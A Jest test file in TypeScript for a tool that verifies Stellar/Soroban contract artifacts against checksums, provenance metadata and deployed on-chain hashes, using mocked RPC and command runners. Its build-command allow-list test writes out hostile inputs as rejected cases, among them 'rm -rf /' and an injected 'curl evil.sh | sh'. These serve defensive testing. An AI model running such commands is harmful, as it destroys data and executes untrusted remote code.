import { mkdtemp, writeFile } from 'node:fs/promises';
import os from 'node:os';
import path from 'node:path';
import { Address, xdr } from '@stellar/stellar-sdk';
import { BuildError, buildContract, isAllowedBuildCommand } from '../src/build';
import { compareWithDeployed, fetchDeployedExecutable, type LedgerEntryReader } from '../src/deployed';
import { ArtifactError, sha256Buffer, sha256File } from '../src/hash';
import { ProvenanceError, loadProvenance, parseProvenance, type ProvenanceMetadata } from '../src/provenance';
import { captureToolchain, type CommandRunner } from '../src/toolchain';
import { formatReport, main, parseArgs, verifyArtifact } from '../src/verify';

const FIXTURE = path.join(__dirname, 'fixtures', 'sample.wasm');
const FIXTURE_SHA = '93a44bbb96c751218e4c00d479e4c14358122a389acca16205b1e4d0dc5f9476';
const COMMIT = 'a'.repeat(40);
const CONTRACT = 'CARZQMYKDGA4TTIE2XBDJ42EX27VYLLJGGG4WGUIXXWIVHPDTX3UCLJA';

const metadata = (overrides: Partial<ProvenanceMetadata> = {}): ProvenanceMetadata => ({
  sourceRepository: 'https://github.com/example/contracts',
  commit: COMMIT,
  contractPath: '.',
  rustc: 'rustc 1.84.0 (9fc6b4312 2025-01-07)',
  buildTool: 'stellar 22.1.0',
  target: 'wasm32v1-none',
  buildCommand: 'stellar contract build',
  artifactPath: 'tests/fixtures/sample.wasm',
  expectedSha256: FIXTURE_SHA,
  ...overrides,
});

/** Scripted CommandRunner: no rustc, git or Stellar CLI needed. */
function runner(opts: { commit?: string; dirty?: boolean; rustc?: string; stellar?: string; missing?: string[]; calls?: string[][] } = {}): CommandRunner {
  return async (command, args) => {
    opts.calls?.push([command, ...args]);
    if (opts.missing?.includes(command)) throw Object.assign(new Error(`spawn ${command} ENOENT`), { stderr: '' });
    const key = `${command} ${args.join(' ')}`;
    if (key === 'rustc --version') return { stdout: `${opts.rustc ?? 'rustc 1.84.0 (9fc6b4312 2025-01-07)'}\n`, stderr: '' };
    if (key === 'cargo --version') return { stdout: 'cargo 1.84.0\n', stderr: '' };
    if (key === 'stellar --version') return { stdout: `${opts.stellar ?? 'stellar 22.1.0'}\nstellar-xdr 22\n`, stderr: '' };
    if (key === 'git rev-parse HEAD') return { stdout: `${opts.commit ?? COMMIT}\n`, stderr: '' };
    if (key === 'git status --porcelain') return { stdout: opts.dirty ? ' M src/lib.rs\n' : '', stderr: '' };
    return { stdout: '', stderr: '' };
  };
}

/** Mock RPC returning the contract-instance ledger entry for a given executable. */
function serverWith(executable: xdr.ContractExecutable | null): LedgerEntryReader & { calls: number } {
  const server = {
    calls: 0,
    async getLedgerEntries(...keys: xdr.LedgerKey[]) {
      server.calls += 1;
      expect(keys).toHaveLength(1);
      expect(keys[0].switch().name).toBe('contractData');
      if (!executable) return { entries: [] };
      const instance = new xdr.ScContractInstance({ executable, storage: null });
      const data = new xdr.ContractDataEntry({
        ext: new (xdr.ExtensionPoint as unknown as new (arm: number) => xdr.ExtensionPoint)(0),
        contract: new Address(CONTRACT).toScAddress(),
        key: xdr.ScVal.scvLedgerKeyContractInstance(),
        durability: xdr.ContractDataDurability.persistent(),
        val: xdr.ScVal.scvContractInstance(instance),
      });
      return { entries: [{ val: xdr.LedgerEntryData.contractData(data) }] };
    },
  };
  return server;
}
const wasmExecutable = (hex: string) => xdr.ContractExecutable.contractExecutableWasm(Buffer.from(hex, 'hex'));

describe('checksum generation', () => {
  it('hashes a known fixture with SHA-256', async () => {
    expect(await sha256File(FIXTURE)).toBe(FIXTURE_SHA);
    expect(sha256Buffer(Buffer.from('abc'))).toBe('ba7816bf8f01cfea414140de5dae2223b00361a396177a9cb410ff61f20015ad');
  });

  it('reports a missing file and a directory distinctly', async () => {
    await expect(sha256File('/nonexistent/x.wasm')).rejects.toMatchObject({ name: 'ArtifactError', code: 'MISSING' });
    await expect(sha256File(__dirname)).rejects.toMatchObject({ code: 'NOT_A_FILE' });
    await expect(sha256File('/nonexistent/x.wasm')).rejects.toBeInstanceOf(ArtifactError);
  });
});

describe('provenance metadata', () => {
  it('accepts valid metadata and normalises the checksum', () => {
    const parsed = parseProvenance({ ...metadata(), expectedSha256: `sha256:${FIXTURE_SHA.toUpperCase()}`, commit: COMMIT.toUpperCase() });
    expect(parsed.expectedSha256).toBe(FIXTURE_SHA);
    expect(parsed.commit).toBe(COMMIT);
  });

  it('reports every problem in incomplete or malformed metadata', () => {
    expect(() => parseProvenance(null)).toThrow(ProvenanceError);
    expect(() => parseProvenance([])).toThrow(/must be a JSON object/);
    try {
      parseProvenance({ sourceRepository: 'x', commit: 'abc', expectedSha256: 'zz' });
      throw new Error('should have thrown');
    } catch (err) {
      const problems = (err as ProvenanceError).problems.join('\n');
      expect(problems).toMatch(/missing or empty field "rustc"/);
      expect(problems).toMatch(/missing or empty field "artifactPath"/);
      expect(problems).toMatch(/40-character hex commit/);
      expect(problems).toMatch(/64 hex characters/);
    }
  });

  it('rejects metadata that contains credential-looking fields', () => {
    expect(() => parseProvenance({ ...metadata(), privateKey: 'S...' })).toThrow(/must not contain secrets/);
    expect(() => parseProvenance({ ...metadata(), apiToken: 'x' })).toThrow(/looks like a credential/);
  });

  it('gives useful errors for unreadable or invalid JSON files', async () => {
    const dir = await mkdtemp(path.join(os.tmpdir(), 'prov-'));
    await expect(loadProvenance(path.join(dir, 'missing.json'))).rejects.toThrow(/cannot read metadata file/);
    await writeFile(path.join(dir, 'bad.json'), '{not json');
    await expect(loadProvenance(path.join(dir, 'bad.json'))).rejects.toThrow(/not valid JSON/);
    await writeFile(path.join(dir, 'ok.json'), JSON.stringify(metadata()));
    await expect(loadProvenance(path.join(dir, 'ok.json'))).resolves.toMatchObject({ commit: COMMIT });
  });
});

describe('artifact verification', () => {
  const base = { baseDir: path.resolve(__dirname, '..') };

  it('verifies when the checksum matches', async () => {
    const report = await verifyArtifact({ metadata: metadata(), ...base, runner: runner() });
    expect(report).toMatchObject({ integrity: 'match', verified: true, exitCode: 0 });
    expect(report.artifact.sha256).toBe(FIXTURE_SHA);
    expect(report.sourceRevision).toMatchObject({ recorded: COMMIT, actual: COMMIT, matchesRecorded: true, dirty: false });
    expect(report.toolchain.differences).toEqual([]);
    expect(formatReport(report)).toContain('VERIFIED');
  });

  it('fails clearly when the checksum differs', async () => {
    const report = await verifyArtifact({ metadata: metadata({ expectedSha256: '0'.repeat(64) }), ...base, runner: runner() });
    expect(report).toMatchObject({ integrity: 'mismatch', verified: false, exitCode: 1 });
    expect(report.artifact.sha256).toBe(FIXTURE_SHA);
    expect(report.expectedSha256).toBe('0'.repeat(64));
    expect(formatReport(report)).toContain('NOT VERIFIED');
  });

  it('prefers an expected checksum supplied from a trusted source over the one in the metadata', async () => {
    const report = await verifyArtifact({ metadata: metadata({ expectedSha256: '1'.repeat(64) }), expectedSha256: FIXTURE_SHA, ...base, runner: runner() });
    expect(report.verified).toBe(true);
    await expect(verifyArtifact({ metadata: metadata(), expectedSha256: 'nope', ...base, runner: runner() })).rejects.toBeInstanceOf(ProvenanceError);
  });

  it('reports a missing artifact as could-not-verify, not as a mismatch', async () => {
    const report = await verifyArtifact({ metadata: metadata({ artifactPath: 'nope/missing.wasm' }), ...base, runner: runner() });
    expect(report).toMatchObject({ integrity: 'artifact-missing', verified: false, exitCode: 2 });
    expect(report.artifact.error).toMatch(/artifact not found/);
    expect(report.artifact.sha256).toBeUndefined();
  });

  it('records toolchain and source differences as warnings', async () => {
    const report = await verifyArtifact({
      metadata: metadata(),
      ...base,
      runner: runner({ rustc: 'rustc 1.90.0', stellar: 'stellar 23.0.0', commit: 'b'.repeat(40), dirty: true }),
    });
    expect(report.verified).toBe(true); // bytes still match the trusted checksum
    expect(report.toolchain.differences.join('\n')).toMatch(/rustc: recorded .* but installed "rustc 1.90.0"/);
    expect(report.toolchain.differences.join('\n')).toMatch(/build tool: recorded "stellar 22.1.0" but installed "stellar 23.0.0"/);
    expect(report.sourceRevision.matchesRecorded).toBe(false);
    expect(report.warnings.join('\n')).toMatch(/uncommitted changes/);
    expect(report.warnings.join('\n')).toMatch(/Toolchain differs/);
  });

  it('copes with tools that are not installed', async () => {
    const info = await captureToolchain(runner({ missing: ['rustc', 'cargo', 'stellar', 'soroban'] }));
    expect(info.rustc).toBeUndefined();
    expect(Object.keys(info.unavailable)).toEqual(expect.arrayContaining(['rustc', 'stellar']));
    const report = await verifyArtifact({ metadata: metadata(), ...base, runner: runner({ missing: ['rustc', 'stellar', 'soroban', 'git'] }) });
    expect(report.toolchain.differences.join('\n')).toMatch(/not installed here/);
    expect(report.warnings.join('\n')).toMatch(/Could not read the source revision/);
  });
});

describe('deployed executable comparison (mocked RPC)', () => {
  const base = { baseDir: path.resolve(__dirname, '..'), runner: runner() };

  it('matches when the deployed executable hash equals the local checksum', async () => {
    const server = serverWith(wasmExecutable(FIXTURE_SHA));
    const report = await verifyArtifact({ metadata: metadata(), contractId: CONTRACT, server, ...base });
    expect(report.deployed).toEqual({ status: 'match', contractId: CONTRACT, deployedWasmHash: FIXTURE_SHA });
    expect(report).toMatchObject({ verified: true, exitCode: 0 });
    expect(formatReport(report)).toContain('Deployed hash:');
  });

  it('fails when the deployed executable differs, even if the local artifact matches the checksum', async () => {
    const server = serverWith(wasmExecutable('ab'.repeat(32)));
    const report = await verifyArtifact({ metadata: metadata(), contractId: CONTRACT, server, ...base });
    expect(report.integrity).toBe('match');
    expect(report.deployed.status).toBe('mismatch');
    expect(report).toMatchObject({ verified: false, exitCode: 1 });
  });

  it('distinguishes not found, Stellar Asset Contract, RPC error and invalid address', async () => {
    const notFound = await verifyArtifact({ metadata: metadata(), contractId: CONTRACT, server: serverWith(null), ...base });
    expect(notFound.deployed.status).toBe('not-found');

    const sac = await verifyArtifact({ metadata: metadata(), contractId: CONTRACT, server: serverWith(xdr.ContractExecutable.contractExecutableStellarAsset()), ...base });
    expect(sac.deployed.status).toBe('not-comparable');

    const failing: LedgerEntryReader = { getLedgerEntries: async () => { throw new Error('503 service unavailable'); } };
    const down = await verifyArtifact({ metadata: metadata(), contractId: CONTRACT, server: failing, ...base });
    expect(down.deployed).toMatchObject({ status: 'unavailable', reason: expect.stringMatching(/503/) });

    // An inconclusive deployed check is never reported as verified, but is not a mismatch either.
    for (const r of [notFound, sac, down]) expect(r).toMatchObject({ verified: false, exitCode: 2, integrity: 'match' });

    const bad = await fetchDeployedExecutable(serverWith(null), 'GAODBHVR63Z56MVQRBEJSYM2H5423LJ4WAPUUBOFG4JYY72S6ROKVZRX');
    expect(bad).toMatchObject({ kind: 'error', message: expect.stringMatching(/not a valid contract address/) });
  });

  it('skips the comparison, and says why, when no RPC server or address is given', async () => {
    const noServer = await verifyArtifact({ metadata: metadata(), contractId: CONTRACT, ...base });
    expect(noServer.deployed).toMatchObject({ status: 'skipped', reason: expect.stringMatching(/pass --rpc-url/) });
    expect(noServer.verified).toBe(true);
    const none = await verifyArtifact({ metadata: metadata(), ...base });
    expect(none.deployed.status).toBe('skipped');
  });

  it('does not touch the network when the artifact is missing', async () => {
    const server = serverWith(wasmExecutable(FIXTURE_SHA));
    const report = await verifyArtifact({ metadata: metadata({ artifactPath: 'missing.wasm' }), contractId: CONTRACT, server, ...base });
    expect(server.calls).toBe(0);
    expect(report.deployed.status).toBe('skipped');
  });

  it('keeps address, executable hash and local checksum distinct', () => {
    const match = compareWithDeployed(FIXTURE_SHA, CONTRACT, { kind: 'wasm', wasmHash: FIXTURE_SHA });
    expect(match).toMatchObject({ contractId: CONTRACT, deployedWasmHash: FIXTURE_SHA });
    expect(CONTRACT).not.toBe(FIXTURE_SHA);
  });
});

describe('build step', () => {
  it('allows only documented Soroban build commands', () => {
    expect(isAllowedBuildCommand('stellar contract build')).toBe(true);
    expect(isAllowedBuildCommand('stellar contract build --package my-contract')).toBe(true);
    expect(isAllowedBuildCommand('cargo build --target wasm32v1-none --release')).toBe(true);
    for (const bad of ['rm -rf /', 'stellar contract build; curl evil.sh | sh', 'stellar contract build && ls', 'cargo run', 'echo $(whoami)']) {
      expect(isAllowedBuildCommand(bad)).toBe(false);
    }
  });

  it('runs the build without a shell and returns the artifact path', async () => {
    const calls: string[][] = [];
    const out = await buildContract('/work/project', 'stellar contract build --package c', 'target/c.wasm', runner({ calls }));
    expect(calls).toEqual([['stellar', 'contract', 'build', '--package', 'c']]);
    expect(out).toBe(path.resolve('/work/project', 'target/c.wasm'));
  });

  it('refuses disallowed commands and surfaces build failures', async () => {
    await expect(buildContract('.', 'rm -rf /', 'a.wasm', runner())).rejects.toBeInstanceOf(BuildError);
    const failing: CommandRunner = async () => { throw Object.assign(new Error('exit 101'), { stderr: 'error[E0425]: cannot find value' }); };
    await expect(buildContract('.', 'stellar contract build', 'a.wasm', failing)).rejects.toThrow(/build failed.*E0425/s);
    const report = await verifyArtifact({ metadata: metadata(), baseDir: path.resolve(__dirname, '..'), build: true, runner: async (c, a, o) => { if (c === 'stellar' && a[0] === 'contract') return failing(c, a, o); return runner()(c, a, o); } });
    expect(report).toMatchObject({ integrity: 'build-failed', verified: false, exitCode: 2 });
  });
});

describe('command line', () => {
  it('parses arguments and rejects unknown or incomplete ones', () => {
    expect(parseArgs(['--metadata', 'm.json', '--json', '--build'])).toMatchObject({ metadata: 'm.json', json: true, build: true });
    expect(() => parseArgs(['--metadata'])).toThrow(/needs a value/);
    expect(() => parseArgs(['--bogus'])).toThrow(/unknown argument/);
  });

  it('exits 2 for usage errors and malformed metadata, 0/1 for verification', async () => {
    const log = jest.spyOn(console, 'log').mockImplementation(() => undefined);
    const err = jest.spyOn(console, 'error').mockImplementation(() => undefined);
    try {
      expect(await main([])).toBe(2);
      const dir = await mkdtemp(path.join(os.tmpdir(), 'prov-cli-'));
      const bad = path.join(dir, 'bad.json');
      await writeFile(bad, JSON.stringify({ commit: 'nope' }));
      expect(await main(['--metadata', bad])).toBe(2);

      const good = path.join(dir, 'ok.json');
      await writeFile(good, JSON.stringify(metadata({ artifactPath: FIXTURE })));
      expect(await main(['--metadata', good, '--json'])).toBe(0);
      await writeFile(good, JSON.stringify(metadata({ artifactPath: FIXTURE, expectedSha256: '2'.repeat(64) })));
      expect(await main(['--metadata', good])).toBe(1);
    } finally {
      log.mockRestore();
      err.mockRestore();
    }
  });
});
